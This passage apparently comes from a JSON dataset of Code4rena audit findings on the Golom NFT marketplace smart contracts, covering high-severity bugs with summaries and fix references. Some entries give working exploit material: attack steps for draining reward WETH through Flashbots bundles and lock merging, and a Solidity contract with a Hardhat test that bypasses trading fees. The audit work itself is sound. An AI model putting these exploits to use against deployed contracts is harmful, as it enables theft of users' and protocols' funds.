      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L172-L210><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185><br>\n\nA malicious user can repeatedly claim the same staker reward for an epoch, provided the transactions all happen in the same block. This can effectively be done using services like [Flashbots bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#can-you-give-a-step-by-step-description-of-how-flashbots-works-for-a-searcher-today) and will result in the draining of the WETH balance of the `RewardDistributor` contract.\n\nThe idea is to bypass the require statement [line 185](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185) which checks if a claim has been already done for the epoch, **for a specific token ID**. By moving the locked tokens in a new lock, a new token ID will be generated and can be used to claim the rewards again, **if the transaction happens in the same block for which the epoch is updated**.\n\nIndeed, when `multiStakerClaim()` is called, the `rewardETH` will be calculated from the amount of tokens locked in `tokenids[tindex]` at the block that triggered the epoch change (variable `epochBeginTime`). If, during this time, an attacker transfers its staked tokens to a new vault using the [`merge`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893) function of the VE token, the function will calculate the amount of staked tokens for the newly created tokenID **as the same as the original tokenID reward**.\n\nA example abuse will look like this (pseudo-code adapted from the PoC) :\n\n```javascript\nlockID = voteEscrow.create_lock(amount, 1 week); // Create lock #1 before\n// IN THE BLOCK OF EPOCH CHANGE\nrewardDistributor.multiStakerClaim([lockId], [0]); // Claim epoch 0 rewards for lock #1\nvoteEscrow.create_lock(1, 1 week); // Create lock #2 (requires 1 Golom token, could be created in advance)\nvoteEscrow.merge(lockId, lockId + 1); // Transfer lock #1 tokens to lock #2\nrewardDistributor.multiStakerClaim([lockId + 1], [0]); // Claim same epoch rewards for lock #2\n// repeat ...\n```\n\nTo abuse this, the attacker needs to follow this steps:\n\n*   Have some locked Golom tokens.\n*   Wait for a `addFee` call that will trigger an epoch change (this can be monitored by looking at the mempool or predicted from block timestamps). Services like Flashbots also [allows for specifying a range of blocks for bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#how-do-i-target-a-timestamp-range-instead-of-a-block-number-when-submitting-a-bundle) for better targeting.\n*   Send a bundle of transactions to be included with the block containing the epoch changing transaction (see the PoC for an example of transactions).\n\nNote that this needs to succeed only once to allow an attacker to drain all WETH funds so if the bundle isn't included for a particular epoch, given the frequency of epoch changes, the bundle will eventually be included and trigger the exploit.\n\n### Proof of Concept\n\nSee warden's [original submission](https://github.com/code-423n4/2022-07-golom-findings/issues/139) for full proof of concept.\n\n### Recommended Mitigation Steps\n\nI initially thought about a few possible solutions:\n\n*   Checking a lock creation time to prevent claiming from locks created in the same block **but the attacker can just create the blocks beforehand.**\n*   Tracking the `msg.sender` or `tx.origin` for preventing multiple calls to `multiStakerClaim` in the same block **but the attacker can just send transactions from different addresses.**\n*   Preventing the merging of locks **but the attacker can just create locks in advance and withdraw/add funds continuously between old/new locks.**\n\nNone really fixes the vulnerability as it comes from the feature of **locks being tradable** meaning it's not practically feasable to know if a lock has already be claimed by an individual **just by looking at the lock ID**.\n\nA possible solution would be to find a way to prevent multiple calls to the same function within a block or better, make a checkpoint of the locks balances for each `epochBeginTime` and uses these values for calculating the rewards (instead of querying the VE contract in the loop).\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/139)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/139#issuecomment-1237934237):**\n > Removed `merge()`<br>\n> Ref: https://github.com/golom-protocol/contracts/commit/b987077f2a227273bc7051e382bd55264162a77e\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a malicious user being able to repeatedly claim the same staker reward for an epoch, provided the transactions all happen in the same block. This is done by bypassing the require statement which checks if a claim has been already done for the epoch, for a specific token ID. By moving the locked tokens in a new lock, a new token ID will be generated and can be used to claim the rewards again, if the transaction happens in the same block for which the epoch is updated.\n\nThe attacker needs to follow steps such as having some locked Golom tokens, waiting for a `addFee` call that will trigger an epoch change, sending a bundle of transactions to be included with the block containing the epoch changing transaction and repeating the process as much as necessary.\n\nThe recommended mitigation steps to fix this vulnerability include finding a way to prevent multiple calls to the same function within a block or making a checkpoint of the locks balances for each `epochBeginTime` and uses these values for calculating the rewards.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/139",
      "tags": [],
      "finders": [
        "Krow10"
      ]
    },
    {
      "id": "8734",
      "title": "[H-08]  Users can avoid paying fees while trading trustlessly & using Golom's network effects",
      "impact": "HIGH",
      "content": "\n*   If a maker makes below mentioned `AvoidsFeesContract` a [reservedAddress](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L220) and hides the info about how much they want their NFT in [order.root](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L58), they can avoid paying fees while trading trustlessly and using the nework effects of golom maketplace with 0 [o.totalAmt](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L52). See POC to get a better idea.\n*   Here the maker uses order.root to hide the amount they want to get paid because it is much cleaner for a POC.\n    *   But since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.\n    *   Reason they would use deadline is because that is something they can control in the golom NFT frontend\n    *   They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check in the contract would look a different\n\n### Proof of Concept\n\n*   Clone the [repo](https://github.com/code-423n4/2022-07-golom) and run `yarn`\n*   Create a `AvoidsFeesContract.sol` contract in `contracts/test/` folder with following code\n\n```\n//contract that avoids paying fees everytime\n\npragma solidity 0.8.11;\n\nimport \"../core/GolomTrader.sol\";\n\n//A maker will be gurranteed a payout if it makes this contract the reservedAddress and hide the payment info about how much they want in Oder.root\n//Users will use this every time to trade to avoid paying fees\n//They use the networking effects of the golom marketplace without paying the fees\ncontract AvoidsFeesContract {\n    GolomTrader public immutable golomTrader;\n\n    constructor(GolomTrader _golomTrader) {\n        golomTrader = _golomTrader;\n    }\n\n    function fillAsk(\n        GolomTrader.Order calldata o,\n        uint256 amount,\n        address referrer,\n        GolomTrader.Payment calldata p,\n        address receiver\n    ) public payable {\n        require(\n            o.reservedAddress == address(this),\n            \"not allowed if signer has not reserved this contract\"\n        ); //the signer will only allow this contract to execute the trade and since it has following checks, they will be guranteed a payout they want without paying the fees\n        require(\n            p.paymentAddress == o.signer,\n            \"signer needs to be the payment address\"\n        );\n        //I am using root as an example because it is much cleaner for a POC.\n        //but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.\n        //Reason they would use deadline is because that is something they can control in the golom NFT frontend\n        //They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check below would look a little different\n        require(\n            p.paymentAmt == uint256(o.root),\n            \"you need to pay what signer wants\"\n        ); //the maker will hide the payment info in oder.root\n\n        golomTrader.fillAsk{value: msg.value}(\n            o,\n            amount,\n            referrer,\n            p,\n            receiver = msg.sender\n        );\n    }\n}\n\n```\n\n*   Add following test in `test/GolomTrader.specs.ts` [here](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L390).\n*   Also, add `const AvoidsFeesContractArtifacts = ethers.getContractFactory('AvoidsFeesContract');` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L14) line and `import { AvoidsFeesContract as AvoidsFeesContractTypes } from '../typechain/AvoidsFeesContract';` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L28) line.\n*   Run `npx hardhat compile && npx hardhat test`\n\n```\n       it.only('should allow malicious contract to execute the trade while bypassing the fees', async () => {\n            //deploy the malicious contract\n            const avoidsFeesContract: AvoidsFeesContractTypes = (await (await AvoidsFeesContractArtifacts).deploy(golomTrader.address)) as AvoidsFeesContractTypes;\n\n            //here the frontend calculates exchangeAmount and prePaymentAmt as a percentage of how much the make wants to receive for their NFT. \n            //as far as the frontend is concerned, the maker inputs 0 for their NFT value which in turn makes the exchangeAmount and prePaymentAmt 0 \n            let exchangeAmount = ethers.utils.parseEther('0'); // nothing to the exchange\n            let prePaymentAmt = ethers.utils.parseEther('0'); // no royalty cut\n            let totalAmt = ethers.utils.parseEther('0');\n            let tokenId = await testErc721.current();\n\n            let nftValueThatMakerWants = ethers.utils.parseEther('10.25');\n\n            const order = {\n                collection: testErc721.address,\n                tokenId: tokenId,\n                signer: await maker.getAddress(),\n                orderType: 0,\n                totalAmt: totalAmt,\n                exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },\n                prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },\n                isERC721: true,\n                tokenAmt: 1,\n                refererrAmt: 0,\n                root: ethers.utils.hexZeroPad(nftValueThatMakerWants.toHexString(), 32), //convert Bignumber to bytes32\n                reservedAddress: avoidsFeesContract.address,\n                nonce: 0,\n                deadline: Date.now() + 100000,\n                r: '',\n                s: '',\n                v: 0,\n            };\n\n            let signature = (await maker._signTypedData(domain, types, order)).substring(2); //a valid signature as far as your frontend goes\n\n            order.r = '0x' + signature.substring(0, 64);\n            order.s = '0x' + signature.substring(64, 128);\n            order.v = parseInt(signature.substring(128, 130), 16);\n\n            let makerBalanceBefore = await ethers.provider.getBalance(await maker.getAddress());\n\n            await avoidsFeesContract.connect(taker).fillAsk(\n                order,\n                1,\n                '0x0000000000000000000000000000000000000000',\n                {\n                    paymentAmt: nftValueThatMakerWants,\n                    paymentAddress: order.signer,\n                },\n                receiver,\n                {\n                    value: nftValueThatMakerWants,\n                }\n            );\n\n            let makerBalanceAfter = await ethers.provider.getBalance(await maker.getAddress());\n\n            expect(await testErc721.balanceOf(await taker.getAddress())).to.be.equals('1');\n            expect(makerBalanceAfter.sub(makerBalanceBefore)).to.be.equals(nftValueThatMakerWants);//maker is guaranteed a payout\n\n        });\n\n```\n\n### Tools Used\n\n*   The [repo](https://github.com/code-423n4/2022-07-golom) itself. (hardhat)\n\n### Recommended Mitigation Steps\n\n*   Make sure that o.totalAmt is greater than p.paymentAmt in addition to [this](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L217) check\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/33)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/33#issuecomment-1214216268):**\n > Circumvented by putting this line in the code\n> \n> `require(o.totalAmt * amount * 15/100 >= p.paymentAmt, 'can only pay 15% extra');`\n\n\n\n***\n\n",
      "summary": "\nA vulnerability has been identified in the code of the GolomTrader.sol contract, which is part of the 2022-07-golom repository on GitHub. This vulnerability could allow users to avoid paying fees when trading trustlessly and making use of the network effects of the Golom marketplace. This is done by making a specific contract, called AvoidsFeesContract, a reservedAddress and hiding the information about how much they want for their NFT in order.root.\n\nThe proof of concept for this vulnerability involves cloning the repository, creating the AvoidsFeesContract contract, and adding a test to the GolomTrader.specs.ts file. This test would deploy the malicious contract and then use the frontend to calculate exchangeAmount and prePaymentAmt as a percentage of how much the maker wants to receive for their NFT. The maker would then input 0 for their NFT value, which in turn would make the exchangeAmount and prePaymentAmt 0. The maker would then hide the payment information in order.root.\n\nThe recommended mitigation steps for this vulnerability include making sure that o.totalAmt is greater than p.paymentAmt in addition to the existing check.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/33",
      "tags": [],
      "finders": [
        "kankodu"
      ]
    },
    {
      "id": "8733",
      "title": "[H-07] `_writeCheckpoint` does not write to storage on same block",
      "impact": "HIGH",
      "content": "\n[VoteEscrowDelegation.sol#L101-L108](https://github.com/golom-protocol/contracts/blob/4e84d5c2115d163ca54a1729da46164e8cf4df6d/contracts/vote-escrow/VoteEscrowDelegation.sol#L101-L108)<br>\n\nIn `VoteEscrowDelegation._writeCheckpoint`, when the checkpoint is overwritten in the same block the new value is set with `memory oldCheckpoint` and thus is never written to storage.\n\n```javascript\nCheckpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];\n\nif (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {\n\noldCheckpoint.delegatedTokenIds = _delegatedTokenIds; \n}\n```\n\nUsers that remove and delegate a token (or call `delegate` on the same token twice) in the same block will only have their first delegation persisted.\n\n### Proof of Concept\n\n*   User delegates a `tokenId` by calling `delegate`.\n*   In the same block, the user decides to delgate the same token to a different token ID and calls `delegate` again which calls `_writeCheckpoint`.  Since this is the second transaction in the same block the if statement in the code block above executes and stores `_delegatedTokenIds` in `memory oldCheckpoint`, thus not persisting the array of `_delegatedTokenIds` in the checkpoint.\n\n### Recommended Mitigation Steps\n\nDefine the `oldCheckpoint` variable as a `storage` pointer:\n\n`Checkpoint storage oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];`\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/455#issuecomment-1211731162):**\n > Just want to add to the impact (in case the judges consider to decrease severity), in my report of this bug ([#625](https://github.com/code-423n4/2022-07-golom-findings/issues/625)) I've mentioned a more severe impact:\n> \n> > An attacker can use this to multiplying his delegation power endlessly, by adding a delegation and removing it in the same block (using a contract to run those 2 functions in the same tx). The delegation will succeed but the removal will fail, this way each time this runs the user delegates again the same token.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/455)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/455#issuecomment-1236183555):**\n > Fixed.\n> Ref: https://github.com/golom-protocol/contracts/commit/74b2e718f6ae9da815b52242a44451527d60d1ae\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/455)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the VoteEscrowDelegation smart contract. The vulnerability occurs when a user delegates a tokenId and then calls the delegate function again in the same block to delegate the same tokenId to a different tokenId. This causes the array of delegatedTokenIds to be stored in memory instead of storage, thus not persisting the array and only persisting the first delegation. This can be mitigated by defining the oldCheckpoint variable as a storage pointer.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/455",
      "tags": [],
      "finders": [
        "0xpiglet",
        "IllIllI",
        "0xsanson",
        "scaraven",
        "async",
        "Dravee",
        "ElKu",
        "JohnSmith",
        "DimitarDimitrov",
        "ak1",
        "0xA5DF",
        "kenzo"
      ]
    },
    {
      "id": "8732",
      "title": "[H-06] NFT transferring won't work because of the external call to `removeDelegation`.",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L242><br>\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L211><br>\n\nThe `VoteEscrowDelegation._transferFrom` function won't work because it calls `this.removeDelegation(_tokenId)`. The `removeDelegation` function is external, so when the call is done by `this.removeDelegation(_tokenId)` msg.sender changes to the contract address.\n\nThis causes the check in the \\`\\` function to (most likely) fail because the contract is not the owner of the NFT, and that will make the function revert.<br>\n`require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');`\n\n### Recommended Mitigation Steps\n\nMake the `removeDelegation` function public and call it without changing the context (i.e. without changing msg.sender to the contract's address).\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/377)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/377#issuecomment-1236183959):**\n > Fixed.\n> \n> Ref: https://github.com/golom-protocol/contracts/commit/10ec920765a5ee2afc2fe269d32ea9138d1156b6\n\n**[0xsaruman (Golom) resolved](https://github.com/code-423n4/2022-07-golom-findings/issues/377)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the `VoteEscrowDelegation._transferFrom` function in the `VoteEscrowDelegation.sol` file. The issue is caused by the `removeDelegation` function, which is external. When the call is done by `this.removeDelegation(_tokenId)`, the msg.sender changes to the contract address. This causes the check in the `` function to fail and the function reverts. The impact of this bug is that the `VoteEscrowDelegation._transferFrom` function won't work.\n\nThe bug was found manually using VS Code and the author's mind. The recommended mitigation step is to make the `removeDelegation` function public and call it without changing the context (i.e. without changing msg.sender to the contract's address).",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/377",
      "tags": [],
      "finders": [
        "TrungOre",
        "Bahurum",
        "0xsanson",
        "CertoraInc",
        "GalloDaSballo",
        "cryptphi",
        "carlitox477",
        "0xA5DF",
        "MEP",
        "kenzo"
      ]
    },
    {
      "id": "8731",
      "title": "[H-05] `addFee` will stop accumulating fee once `rewardToken` has reached max supply",
      "impact": "HIGH",
      "content": "\n`RewardDistributor` will stop accumulating fees for staker rewards once `rewardToken` supply has reached the maximum supply (1 billion).\n\n### Vulnerability Details\n\n[RewardDistributor.sol#L98-L138](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L98-L138)\n\n    function addFee(address[2] memory addr, uint256 fee) public onlyTrader {\n        if (rewardToken.totalSupply() > 1000000000 * 10**18) {\n            // if supply is greater then a billion dont mint anything, dont add trades\n            return;\n        }\n        \n        ...\n        \n        feesTrader[addr[0]][epoch] = feesTrader[addr[0]][epoch] + fee;\n        feesExchange[addr[1]][epoch] = feesExchange[addr[1]][epoch] + fee;\n        epochTotalFee[epoch] = epochTotalFee[epoch] + fee;\n    }\n\nThe check at the beginning of `addFee` is supposed to stop `RewardDistributor` from minting additional rewardToken once it has reached 1 billion supply. However, the current implementation has a side effect of causing the function to skip recording accumulated trading fees (the last 3 lines of the function). This will cause stakers to lose their trading fee rewards once the max supply has been reached, and the funds will be permanently locked in the contract.\n\n### Proof of Concept\n\n*   Alice staked `GOLOM` to receive fee rewards from `RewardDistributor`.\n*   `GOLOM` supply reaches 1 billion token.\n*   Traders keep trading on `GolomTrader`, sending protocol fees to `RewardDistributor`. However, `RewardDistributor.addFee` does not update the fee accounting.\n*   Alice won't receive any fee reward and protocol fees are stuck in the contract.\n\n### Recommended Mitigation Steps\n\nModify `addFee` so that the check won't skip accruing trade fees:\n\n    function addFee(address[2] memory addr, uint256 fee) public onlyTrader {\n        if (block.timestamp > startTime + (epoch) * secsInDay) {\n            uint256 previousEpochFee = epochTotalFee[epoch];\n            epoch = epoch + 1;\n\n            if (rewardToken.totalSupply() > 1000000000 * 10**18) {\n                emit NewEpoch(epoch, 0, 0, previousEpochFee);\n            } else {\n                uint256 tokenToEmit = (dailyEmission * (rewardToken.totalSupply() - rewardToken.balanceOf(address(ve)))) /\n                    rewardToken.totalSupply();\n                uint256 stakerReward = (tokenToEmit * rewardToken.balanceOf(address(ve))) / rewardToken.totalSupply();\n\n                rewardStaker[epoch] = stakerReward;\n                rewardTrader[epoch] = ((tokenToEmit - stakerReward) * 67) / 100;\n                rewardExchange[epoch] = ((tokenToEmit - stakerReward) * 33) / 100;\n                rewardToken.mint(address(this), tokenToEmit);\n                epochBeginTime[epoch] = block.number;\n                if (previousEpochFee > 0) {\n                    if (epoch == 1){\n                        epochTotalFee[0] =  address(this).balance; // staking and trading rewards start at epoch 1, for epoch 0 all contract ETH balance is converted to staker rewards rewards.\n                        weth.deposit{value: address(this).balance}();  \n                    }else{\n                        weth.deposit{value: previousEpochFee}();\n                    }\n                }\n                emit NewEpoch(epoch, tokenToEmit, stakerReward, previousEpochFee);\n            }\n        }\n        feesTrader[addr[0]][epoch] = feesTrader[addr[0]][epoch] + fee;\n        feesExchange[addr[1]][epoch] = feesExchange[addr[1]][epoch] + fee;\n        epochTotalFee[epoch] = epochTotalFee[epoch] + fee;\n        return;\n    }\n\n**[0xsaruman (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/320)**\n\n**[0xsaruman (Golom) resolved and commented](https://github.com/code-423n4/2022-07-golom-findings/issues/320#issuecomment-1234338228):**\n > Resolved in https://github.com/golom-protocol/contracts/commit/192e152dde2eed6c01a3945aa5fd223ff786ca5e\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the RewardDistributor contract of the 2022-07-golom project. The vulnerability affects the function addFee, which is responsible for recording trading fees for staker rewards. The check at the beginning of the function is meant to stop RewardDistributor from minting additional rewardTokens once it has reached 1 billion supply, but it also causes the function to skip recording accumulated trading fees. This means that stakers will not receive their trading fee rewards once the max supply has been reached, and the funds will be permanently locked in the contract. \n\nA proof of concept is provided to demonstrate the issue. Alice stakes GOLOM to receive fee rewards from RewardDistributor. Once GOLOM supply reaches 1 billion token, traders keep trading on GolomTrader, sending protocol fees to RewardDistributor. However, RewardDistributor.addFee does not update the fee accounting, so Alice won't receive any fee reward and the protocol fees are stuck in the contract.\n\nThe recommended mitigation step is to modify addFee so that the check won't skip accruing trade fees. The modified code is provided, which should be implemented in order to fix the vulnerability.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/320",
      "tags": [],
      "finders": [
        "reassor",
        "0x52",
        "GiveMeTestEther",
        "rbserver",
        "rokinot",
        "scaraven",
        "Picodes",
        "M0ndoHEHE",
        "kaden",
        "berndartmueller",
        "Lambda",
        "shenwilly",
        "obront",
        "GimelSec"
      ]
    },
    {
      "id": "8730",
      "title": "[H-04] Old delegatee not deleted when delegating to new tokenId",
      "impact": "HIGH",
      "content": "\n[VoteEscrowDelegation.sol#L80](https://github.com/code-423n4/2022-07-golom/blob/8f198624b97addbbe9602a451c908ea51bd3357c/contracts/vote-escrow/VoteEscrowDelegation.sol#L80)<br>\n\nIn `delegate`, when a user delegates to a new tokenId, the tokenId is not removed from the current delegatee. Therefore, one user can easily multiply his voting power, which makes the toking useless for voting / governance decisions.\n\n### Proof Of Concept\n\nBob owns the token with ID 1 with a current balance of 1000. He also owns tokens 2, 3, 4, 5. Therefore, he calls `delegate(1, 2)`, `delegate(1, 3)`, `delegate(1, 4)`, `delegate(1, 5)`. Now, if there is a governance decision and `getVotes` is called, Bobs balance of 1000 is included in token 2, 3, 4, and 5. Therefore, he quadrupled the voting power of token 1.\n\n### Recommended Mitigation Steps\n\nRemove the entry in `delegatedTokenIds` of the old delegatee or simply call `removeDelegation` first.\n\n**[zeroexdead (Golom) confirmed](https://github.com/code-423n4/2022-07-golom-findings/issues/169)**\n\n**[zeroexdead (Golom) commented](https://github.com/code-423n4/2022-07-golom-findings/issues/169#issuecomment-1238345165):**\n > Fixed. \n> \n> Ref: https://github.com/golom-protocol/contracts/commit/c74d95b4105eeb878d2781982178db5ca08a1a9b\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the VoteEscrowDelegation.sol file on line 80 of the code. The vulnerability allows users to multiply their voting power, which makes the token useless for voting and governance decisions. This is done by calling the `delegate` function with different tokenIds. For example, Bob owns token 1 with a balance of 1000 and also owns tokens 2, 3, 4, and 5. If he calls `delegate(1, 2)`, `delegate(1, 3)`, `delegate(1, 4)`, and `delegate(1, 5)`, then when `getVotes` is called, Bob's balance of 1000 is included in tokens 2, 3, 4, and 5, thus quadrupling the voting power of token 1. To mitigate this vulnerability, the entry in `delegatedTokenIds` of the old delegatee should be removed or `removeDelegation` should be called first.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "https://github.com/code-423n4/2022-07-golom-findings/issues/169",
      "tags": [
        "Vote"
      ],
      "finders": [
        "0x52",
        "scaraven",
        "berndartmueller",
        "GiveMeTestEther",
        "arcoun",
        "Twpony",
        "0xDjango",
        "Lambda",
        "Green",
        "0xA5DF",
        "MEP",
        "kenzo",
        "Bahurum",
        "0xsanson",
        "cccz",
        "kyteg",
        "0xpiglet",
        "panprog",
        "GalloDaSballo",
        "rajatbeladiya",
        "dipp",
        "neumo",
        "obront",
        "GimelSec"
      ]
    },
    {
      "id": "8729",
      "title": "[H-03] GolomTrader's `_settleBalances` double counts protocol fee, reducing taker's payout for a NFT sold",
      "impact": "HIGH",
      "content": "\nCurrently `(o.totalAmt * 50) / 10000)` protocol fee share is multiplied by `amount` twice when being accounted for as a deduction from the total in amount due to the `msg.sender` taker calculations in \\_settleBalances(), which is called by fillBid() and fillCriteriaBid() to handle the payouts.\n\nSetting the severity to be high as reduced payouts is a fund loss impact for taker, which receives less than it's due whenever `amount > 1`.\n\nNotice that the amount lost to the taker is left on the contract balance and currently is subject to other vulnerabilities, i.e. can be easily stolen by an attacker that knowns these specifics and tracks contract state. When these issues be fixed this amount to be permanently frozen on the GolomTrader's balance as it's unaccounted for in all subsequent calculations (i.e. all the transfers are done with regard to the accounts recorded, this extra sum is unaccounted, there is no general native funds rescue function, so when all other mechanics be fixed the impact will be permanent freeze of the part of taker's funds).\n\n### Proof of Concept\n\n\\_settleBalances() uses `(o.totalAmt - protocolfee - ...) * amount`, which is `o.totalAmt * amount - ((o.totalAmt * 50) / 10000) * amount * amount - ...`, counting protocol fee extra `amount - 1` times:\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L389-L399>\n\n```solidity\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *\n                    amount -\n                    p.paymentAmt,\n                msg.sender\n            );\n        } else {\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,\n                msg.sender\n            );\n```\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L400>\n\n```solidity\n    function _settleBalances(\n        Order calldata o,\n        uint256 amount,\n        address referrer,\n        Payment calldata p\n    ) internal {\n        uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount;\n        WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);\n        WETH.withdraw(o.totalAmt * amount);\n        payEther(protocolfee, address(distributor));\n        payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);\n        payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);\n        if (o.refererrAmt > 0 && referrer != address(0)) {\n            payEther(o.refererrAmt * amount, referrer);\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *\n                    amount -\n                    p.paymentAmt,\n                msg.sender\n            );\n        } else {\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,\n                msg.sender\n            );\n        }\n```\n\nSay, if `amount = 6`, while `((o.totalAmt * 50) / 10000) = 1 ETH`, `6 ETH` is total `protocolfee` and needs to be removed from `o.totalAmt * 6` to calculate taker's part, while `1 ETH * 6 * 6 = 36 ETH` is actually removed in the calculation, i.e. `36 - 6 = 30 ETH` of taker's funds will be frozen on the contract balance.\n\n### Recommended Mitigation Steps\n\nConsider accounting for `amount` once, for example:\n\n<https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L403>\n\n```solidity\n    function _settleBalances(\n        Order calldata o,\n        uint256 amount,\n        address referrer,\n        Payment calldata p\n    ) internal {\n-       uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount;\n+       uint256 protocolfee = ((o.totalAmt * 50) / 10000);\n        WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);\n        WETH.withdraw(o.totalAmt * amount);\n-       payEther(protocolfee, address(distributor));\n+       payEther(protocolfee * amount, address(distributor));\n        payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);\n        payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);\n        if (o.refererrAmt > 0 && referrer != address(0)) {\n            payEther(o.refererrAmt * amount, referrer);\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *\n                    amount -\n                    p.paymentAmt,\n                msg.sender\n            );\n        } else {\n            payEther(\n                (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,\n                msg.sender\n            );\n        }\n        payEther(p.paymentAmt, p.paymentAddress);\n-       distributor.addFee([msg.sender, o.exchange.paymentAddress], protocolfee);\n+       distributor.addFee([msg.sender, o.exchange.paymentAddress], protocolfee * amount);\n    